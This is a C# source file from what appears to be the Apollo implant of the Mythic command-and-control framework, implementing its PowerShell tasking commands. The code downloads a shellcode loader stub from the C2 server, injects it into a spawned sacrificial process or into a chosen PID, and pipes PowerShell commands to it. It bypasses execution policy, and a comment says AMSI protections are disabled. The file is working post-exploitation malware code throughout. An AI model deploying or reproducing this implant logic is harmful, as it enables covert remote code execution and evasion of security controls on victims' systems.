#define COMMAND_NAME_UPPER

#if DEBUG
#undef POWERPICK
#undef PSINJECT
#undef POWERSHELL
#undef PSCLEAR
#undef PSIMPORT
#undef LIST_SCRIPTS
#define POWERPICK
#define PSINJECT
#define POWERSHELL
#define PSCLEAR
#define PSIMPORT
#define LIST_SCRIPTS
#endif


#if POWERPICK || PSINJECT || POWERSHELL || PSCLEAR || PSIMPORT || LIST_SCRIPTS

using Newtonsoft.Json;
using System;
using System.Diagnostics;
using AJ = Apollo.Jobs;
using System.Management.Automation;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Globalization;
using System.Management.Automation.Host;
using System.Management.Automation.Runspaces;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.IO.Pipes;
using System.Runtime.Serialization.Formatters.Binary;
using IPC;
using System.IO;
using Apollo.Injection;
using System.Linq;
using Mythic.Structs;
using Apollo.Tasks;
using Apollo.Evasion;

namespace Apollo.CommandModules
{
    public class PowerShellManager
    {
        internal static Dictionary<string, string> LoadedPowerShellScripts = new Dictionary<string, string>();

        /// <summary>
        /// Execute arbitrary powershell commands within
        /// a PS Runspace. Various AMSI options are disabled
        /// as well. See: SharpSploit Shell.PowerShellExecute
        /// </summary>
        /// <param name="job">Job associated with this task.</param>
        /// <param name="agent">Agent associated with this task.</param>
        /// 
        public static void Execute(AJ.Job job, Agent agent)
        {
            switch (job.Task.command)
            {
#if POWERPICK
                case "powerpick":
                    ExecutePowerPick(job, agent);
                    break;
#endif
#if POWERSHELL
                case "powershell":
                    ExecutePowerShell(job, agent);
                    break;
#endif
#if PSIMPORT
                case "psimport":
                    SetPowerShellImportFile(job, agent);
                    break;
#endif
#if PSINJECT
                case "psinject":
                    ExecutePsInject(job, agent);
                    break;
#endif
#if PSCLEAR
                case "psclear":
                    SetPowerShellImportFile(job, agent, true);
                    break;
#endif
#if LIST_SCRIPTS
                case "list_scripts":
                    GetLoadedPowerShellScriptNames(job, agent, true);
                    break;
#endif
                default:
                    job.SetError("Unsupported code path in PowerShellManager.");
                    break;
            }
        }
#if LIST_SCRIPTS
        public static void GetLoadedPowerShellScriptNames(AJ.Job job, Agent agent, bool clearFile = false)
        {
            Task task = job.Task;
            string result = "";
            foreach (KeyValuePair<string, string> entry in LoadedPowerShellScripts)
            {
                result += entry.Key + "\n";
            }

            if (result == "")
                result = "No scripts currently loaded.";
            job.SetComplete(result);
        }
#endif
#if PSCLEAR || PSIMPORT
        public static void SetPowerShellImportFile(AJ.Job job, Agent agent, bool clearFile = false)
        {
            Task task = job.Task;
            if (clearFile)
            {
                LoadedPowerShellScripts = new Dictionary<string, string>();
                job.SetComplete("Cleared PowerShell imports.");
                return;
            }
            JObject json = (JObject)JsonConvert.DeserializeObject(task.parameters);
            /*
             * Response from the server should be of the form:f
             * {
             * "assembly_id": "file_id",
             * "assembly_name": "name_of_assembly"
             * }
             */
            string file_id = json.Value<string>("file_id");
            string short_name = json.Value<string>("file_name");

            byte[] psImportBytes = agent.Profile.GetFile(job.Task.id, file_id, agent.Profile.ChunkSize);
            if (psImportBytes == null || psImportBytes.Length == 0)
            {
                job.SetError(String.Format("PowerShell Import (File ID: {0}) was unretrievable or of zero length.", file_id));
                //agent.PowerShellImportFileID = "";
                return;
            }
            string psImportString = System.Text.Encoding.UTF8.GetString(psImportBytes, 0, psImportBytes.Length);

            LoadedPowerShellScripts[short_name] = psImportString;
            job.SetComplete($"Imported {short_name}");
        }
#endif
#if POWERSHELL

        public static void ExecutePowerShell(AJ.Job job, Agent agent)
        {
            Task task = job.Task;
            string args = task.parameters;
            string scripts = GetAllLoadedScripts();
            try
            {
                if (scripts != "")
                {
                    args = scripts + "\n\n" + args;
                }
                string result = InvokePS(args);

                job.SetComplete(result);
            }
            catch (Exception e)
            {
                job.SetError($"Error invoking PowerShell: {e.Message}\n\n{e.StackTrace}");
            }
        }
#endif
#if LIST_SCRIPTS || POWERPICK || POWERSHELL || PSINJECT
        internal static string GetAllLoadedScripts()
        {
            string result = "";
            foreach (KeyValuePair<string, string> entry in LoadedPowerShellScripts)
            {
                result += entry.Value + "\n\n";
            }
            return result;
        }
#endif

#if POWERPICK
        public static void ExecutePowerPick(AJ.Job job, Agent agent)
        {
            Task task = job.Task;
            string psCommand;
            string loadedScript = GetAllLoadedScripts();
            string loaderStubID = "";
            byte[] loaderStub = null;
            string pipeName;


            JObject json = (JObject)JsonConvert.DeserializeObject(task.parameters);

            loaderStubID = json.Value<string>("loader_stub_id");
            // Reset the loader stub each time as a new named pipe is given to us from on high.
            loaderStub = agent.Profile.GetFile(task.id, loaderStubID, agent.Profile.ChunkSize);
            if (loaderStub == null || loaderStub.Length == 0)
            {
                job.SetError(String.Format("Unable to retrieve assembly loader shellcode stub with ID {0}", loaderStubID));
                return;
            }

            pipeName = json.Value<string>("pipe_name");
            if (pipeName == "")
            {
                job.SetError("No pipe name was given to connect to (server issue).");
                return;
            }

            psCommand = json.Value<string>("powershell_params");
            if (psCommand == "")
            {
                job.SetError("No parameters were given to execute.");
                return;
            }


            // Spawn new process
            // Inject into process
            // Send PowerShell to process
            // Receive output from PowerShell

            //ProcessWithAnonymousPipeIO sacrificialProcess = null;

            SacrificialProcesses.SacrificialProcess sacrificialProcess = null;
            string sacrificialApp;

            var startupArgs = EvasionManager.GetSacrificialProcessStartupInformation();
            try
            {
                sacrificialProcess = new SacrificialProcesses.SacrificialProcess(startupArgs.Application, startupArgs.Arguments, true);
                sacrificialProcess.Exited += delegate(object sender, EventArgs e)
                {
                    job.SetComplete("");
                };

                ApolloTaskResponse response;
                Mythic.Structs.AssemblyResponse asmResponse;


                if (sacrificialProcess.Start())
                {
                    string status = "";
                    if (!string.IsNullOrEmpty(startupArgs.Arguments))
                        status = $"Sacrificial process spawned '{startupArgs.Application} {startupArgs.Arguments}' (PID: {sacrificialProcess.PID})\n";
                    else
                        status = $"Sacrificial process spawned {startupArgs.Application} (PID: {sacrificialProcess.PID})\n";
                    job.AddOutput(status);
                    job.ProcessID = (int)sacrificialProcess.PID;
                    job.sacrificialProcess = sacrificialProcess;
                    asmResponse = new Mythic.Structs.AssemblyResponse()
                    {
                        sacrificial_pid = (int)sacrificialProcess.PID,
                        sacrificial_process_name = startupArgs.Application
                    };

                    #region PowerPick Testing
                    // setup redirection
                    sacrificialProcess.OutputDataReceived = delegate (string data)
                    {
                        job.AddOutput(data);
                    };

                    sacrificialProcess.ErrorDataReceived = delegate (string data)
                    {
                        job.AddOutput(data);
                    };
                    #endregion

                    if (sacrificialProcess.Inject(loaderStub))
                    {
                        // Connect to initial named pipe and send job
                        // Also sends along task ID to use as new named pipe name to read output
                        // This prevents colliding with other jobs that might be running at the same time
                        // ...hopefully
                        NamedPipeClientStream pipeClient = new NamedPipeClientStream(pipeName);

                        pipeClient.Connect(30000);

                        BinaryFormatter bf = new BinaryFormatter();
                        bf.Binder = new PowerShellJobMessageBinder();
                        bf.Serialize(pipeClient, new PowerShellJobMessage()
                        {
                            LoadedScript = loadedScript,
                            Command = psCommand,
                            ID = job.Task.id,
                        });


                        try
                        {
                            var msg = (PowerShellTerminatedMessage)bf.Deserialize(pipeClient);
                            #region old good code
                            //List<string> output = new List<string>();
                            //using (StreamReader sr = new StreamReader(pipeClient))
                            //{
                            //    //sr.ReadLine();
                            //    while (!sr.EndOfStream)
                            //    {
                            //        var line = sr.ReadLine();
                            //        if (output.Count > 4)
                            //        {
                            //            asmResponse.output = output.ToArray();
                            //            response = new ApolloTaskResponse(job.Task.id, false, asmResponse, "");
                            //            agent.TryPostResponse(task.id, response);
                            //            output.Clear();
                            //        }
                            //        output.Add(line);
                            //    }
                            //    if (output.Count > 0)
                            //    {
                            //        asmResponse.output = output.ToArray();
                            //        response = new ApolloTaskResponse(job.Task.id, false, asmResponse, "");
                            //        agent.TryPostResponse(task.id, response);
                            //        output.Clear();
                            //    }
                            //}
                            #endregion
                        }
                        catch (Exception e)
                        {
                            job.SetError(String.Format("Error while reading from stream: {0}", e.Message));
                            return;
                        }
                    }
                    else
                    {
                        job.SetError($"Could not inject loader stub: {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}");
                    }
                }
                else
                {
                    job.SetError($"Could not start sacrificial process: {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}");
                }
            }
            catch (Exception e)
            {
                if (sacrificialProcess != null)
                {
                    job.SetError(String.Format("Error in powerpick (PID: {0}). Reason: {1}", sacrificialProcess.PID, e.Message));
                }
                else job.SetError(String.Format("Error in powerpick. Reason: {0}", e.Message));
            }
            finally
            {
                if (!sacrificialProcess.HasExited)
                {
                    sacrificialProcess.Kill();
                }
            }
        }

        private static void SacrificialProcess_Exited(object sender, EventArgs e)
        {
            throw new NotImplementedException();
        }
#endif


#if PSINJECT

        public static void ExecutePsInject(AJ.Job job, Agent agent)
        {

            Task task = job.Task;
            string psCommand;
            string loadedScript = GetAllLoadedScripts();
            string loaderStubID;
            byte[] loaderStub;
            string pipeName;
            int pid = -1;

            JObject json = (JObject)JsonConvert.DeserializeObject(task.parameters);

            loaderStubID = json.Value<string>("loader_stub_id");
            // Reset the loader stub each time as a new named pipe is given to us from on high.
            loaderStub = null;
            loaderStub = agent.Profile.GetFile(task.id, loaderStubID, agent.Profile.ChunkSize);
            if (loaderStub == null || loaderStub.Length == 0)
            {
                job.SetError(String.Format("Unable to retrieve assembly loader shellcode stub with ID {0}", loaderStubID));
                return;
            }

            pipeName = json.Value<string>("pipe_name");
            if (pipeName == "")
            {
                job.SetError("No pipe name was given to connect to (server error).");
                return;
            }

            psCommand = json.Value<string>("powershell_params");
            if (psCommand == "")
            {
                job.SetError("No commands were given to execute.");
                return;
            }

            pid = json.Value<int>("pid");

            job.ProcessID = pid;
            // Spawn new process
            // Inject into process
            // Send PowerShell to process
            // Receive output from PowerShell


            try
            {

                ApolloTaskResponse response;
                var injectionType = Injection.InjectionTechnique.GetInjectionTechnique();
                var injectionHandler = (Injection.InjectionTechnique)Activator.CreateInstance(injectionType, new object[] { loaderStub, (uint)pid });

                if (injectionHandler.Inject())
                {
                    // Connect to initial named pipe and send job
                    // Also sends along task ID to use as new named pipe name to read output
                    // This prevents colliding with other jobs that might be running at the same time
                    // ...hopefully
                    NamedPipeClientStream pipeClient = new NamedPipeClientStream(pipeName);

                    pipeClient.Connect(30000);

                    BinaryFormatter bf = new BinaryFormatter();
                    bf.Binder = new PowerShellJobMessageBinder();
                    bf.Serialize(pipeClient, new PowerShellJobMessage()
                    {
                        LoadedScript = loadedScript,
                        Command = psCommand,
                        ID = job.Task.id,
                    });


                    try
                    {
                        List<string> output = new List<string>();
                        Mythic.Structs.AssemblyResponse asmResponse = new Mythic.Structs.AssemblyResponse()
                        {
                            sacrificial_pid = pid,
                            sacrificial_process_name = System.Diagnostics.Process.GetProcessById(pid).ProcessName
                        };
                        using (StreamReader sr = new StreamReader(pipeClient))
                        {
                            //sr.ReadLine();
                            while (!sr.EndOfStream)
                            {
                                var line = sr.ReadLine();
                                if (line != null)
                                {
                                    job.AddOutput(line);
                                }
                            }
                        }
                        job.SetComplete("");
                    }
                    catch (Exception e)
                    {
                        job.SetError(String.Format("Error while reading from stream: {0}", e.Message));
                    }
                }
                else
                {
                    job.SetError($"Could not inject into PID {pid}: {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}");
                }
            }
            catch (Exception e)
            {
                job.SetError(String.Format("Error in psinject. Reason: {0}\n{1}", e.Message, e.StackTrace));
            }
        }
#endif
#if POWERSHELL
        public static string InvokePS(string command)
        {
            // I had to implement a custom PSHost in order to get Write-Host to work.
            // This wouldn't be an issue if all PowerShell scripts used Write-Output
            // instead of Write-Host, but enough use Write-Host that it's worth it
            // to implement a custom PSHost
            CustomPSHost host = new CustomPSHost();

            var state = InitialSessionState.CreateDefault();
            state.AuthorizationManager = null;                  // Bypass PowerShell execution policy

            using (Runspace runspace = RunspaceFactory.CreateRunspace(host, state))
            {
                runspace.Open();

                using (Pipeline pipeline = runspace.CreatePipeline())
                {
                    pipeline.Commands.AddScript(command);
                    pipeline.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);
                    pipeline.Commands.Add("out-default");

                    pipeline.Invoke();
                }
            }

            string output = ((CustomPSHostUserInterface)host.UI).Output;

            return output;
        }
        class CustomPSHost : PSHost
        {
            private Guid _hostId = Guid.NewGuid();
            private CustomPSHostUserInterface _ui = new CustomPSHostUserInterface();

            public override Guid InstanceId
            {
                get { return _hostId; }
            }

            public override string Name
            {
                get { return "ConsoleHost"; }
            }

            public override Version Version
            {
                get { return new Version(1, 0); }
            }

            public override PSHostUserInterface UI
            {
                get { return _ui; }
            }


            public override CultureInfo CurrentCulture
            {
                get { return Thread.CurrentThread.CurrentCulture; }
            }

            public override CultureInfo CurrentUICulture
            {
                get { return Thread.CurrentThread.CurrentUICulture; }
            }

            public override void EnterNestedPrompt()
            {
                throw new NotImplementedException("EnterNestedPrompt is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
            }

            public override void ExitNestedPrompt()
            {
                throw new NotImplementedException("ExitNestedPrompt is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
            }

            public override void NotifyBeginApplication()
            {
                return;
            }

            public override void NotifyEndApplication()
            {
                return;
            }

            public override void SetShouldExit(int exitCode)
            {
                return;
            }
        }

        class CustomPSHostUserInterface : PSHostUserInterface
        {
            // Replace StringBuilder with whatever your preferred output method is (e.g. a socket or a named pipe)
            private StringBuilder _sb;
            private CustomPSRHostRawUserInterface _rawUi = new CustomPSRHostRawUserInterface();

            public CustomPSHostUserInterface()
            {
                _sb = new StringBuilder();
            }

            public override void Write(ConsoleColor foregroundColor, ConsoleColor backgroundColor, string value)
            {
                _sb.Append(value);
            }

            public override void WriteLine()
            {
                _sb.Append("\n");
            }

            public override void WriteLine(ConsoleColor foregroundColor, ConsoleColor backgroundColor, string value)
            {
                _sb.Append(value + "\n");
            }

            public override void Write(string value)
            {
                _sb.Append(value);
            }

            public override void WriteDebugLine(string message)
            {
                _sb.AppendLine("DEBUG: " + message);
            }

            public override void WriteErrorLine(string value)
            {
                _sb.AppendLine("ERROR: " + value);
            }

            public override void WriteLine(string value)
            {
                _sb.AppendLine(value);
            }

            public override void WriteVerboseLine(string message)
            {
                _sb.AppendLine("VERBOSE: " + message);
            }

            public override void WriteWarningLine(string message)
            {
                _sb.AppendLine("WARNING: " + message);
            }

            public override void WriteProgress(long sourceId, ProgressRecord record)
            {
                return;
            }

            public string Output
            {
                get { return _sb.ToString(); }
            }

            public override Dictionary<string, PSObject> Prompt(string caption, string message, System.Collections.ObjectModel.Collection<FieldDescription> descriptions)
            {
                throw new NotImplementedException("Prompt is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
            }

            public override int PromptForChoice(string caption, string message, System.Collections.ObjectModel.Collection<ChoiceDescription> choices, int defaultChoice)
            {
                throw new NotImplementedException("PromptForChoice is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
            }

            public override PSCredential PromptForCredential(string caption, string message, string userName, string targetName, PSCredentialTypes allowedCredentialTypes, PSCredentialUIOptions options)
            {
                throw new NotImplementedException("PromptForCredential1 is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
            }

            public override PSCredential PromptForCredential(string caption, string message, string userName, string targetName)
            {
                throw new NotImplementedException("PromptForCredential2 is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
            }

            public override PSHostRawUserInterface RawUI
            {
                get { return _rawUi; }
            }

            public override string ReadLine()
            {
                throw new NotImplementedException("ReadLine is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
            }

            public override System.Security.SecureString ReadLineAsSecureString()
            {
                throw new NotImplementedException("ReadLineAsSecureString is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
            }
        }


        class CustomPSRHostRawUserInterface : PSHostRawUserInterface
        {
            // Warning: Setting _outputWindowSize too high will cause OutOfMemory execeptions.  I assume this will happen with other properties as well
            private Size _windowSize = new Size { Width = 120, Height = 100 };

            private Coordinates _cursorPosition = new Coordinates { X = 0, Y = 0 };

            private int _cursorSize = 1;
            private ConsoleColor _foregroundColor = ConsoleColor.White;
            private ConsoleColor _backgroundColor = ConsoleColor.Black;

            private Size _maxPhysicalWindowSize = new Size
            {
                Width = int.MaxValue,
                Height = int.MaxValue
            };

            private Size _maxWindowSize = new Size { Width = 100, Height = 100 };
            private Size _bufferSize = new Size { Width = 100, Height = 1000 };
            private Coordinates _windowPosition = new Coordinates { X = 0, Y = 0 };
            private String _windowTitle = "";

            public override ConsoleColor BackgroundColor
            {
                get { return _backgroundColor; }
                set { _backgroundColor = value; }
            }

            public override Size BufferSize
            {
                get { return _bufferSize; }
                set { _bufferSize = value; }
            }

            public override Coordinates CursorPosition
            {
                get { return _cursorPosition; }
                set { _cursorPosition = value; }
            }

            public override int CursorSize
            {
                get { return _cursorSize; }
                set { _cursorSize = value; }
            }

            public override void FlushInputBuffer()
            {
                throw new NotImplementedException("FlushInputBuffer is not implemented.");
            }

            public override ConsoleColor ForegroundColor
            {
                get { return _foregroundColor; }
                set { _foregroundColor = value; }
            }

            public override BufferCell[,] GetBufferContents(Rectangle rectangle)
            {
                throw new NotImplementedException("GetBufferContents is not implemented.");
            }

            public override bool KeyAvailable
            {
                get { throw new NotImplementedException("KeyAvailable is not implemented."); }
            }

            public override Size MaxPhysicalWindowSize
            {
                get { return _maxPhysicalWindowSize; }
            }

            public override Size MaxWindowSize
            {
                get { return _maxWindowSize; }
            }

            public override KeyInfo ReadKey(ReadKeyOptions options)
            {
                throw new NotImplementedException("ReadKey is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.");
            }

            public override void ScrollBufferContents(Rectangle source, Coordinates destination, Rectangle clip, BufferCell fill)
            {
                throw new NotImplementedException("ScrollBufferContents is not implemented");
            }

            public override void SetBufferContents(Rectangle rectangle, BufferCell fill)
            {
                throw new NotImplementedException("SetBufferContents is not implemented.");
            }

            public override void SetBufferContents(Coordinates origin, BufferCell[,] contents)
            {
                throw new NotImplementedException("SetBufferContents is not implemented");
            }

            public override Coordinates WindowPosition
            {
                get { return _windowPosition; }
                set { _windowPosition = value; }
            }

            public override Size WindowSize
            {
                get { return _windowSize; }
                set { _windowSize = value; }
            }

            public override string WindowTitle
            {
                get { return _windowTitle; }
                set { _windowTitle = value; }
            }
        }
#endif

    }
}
#endif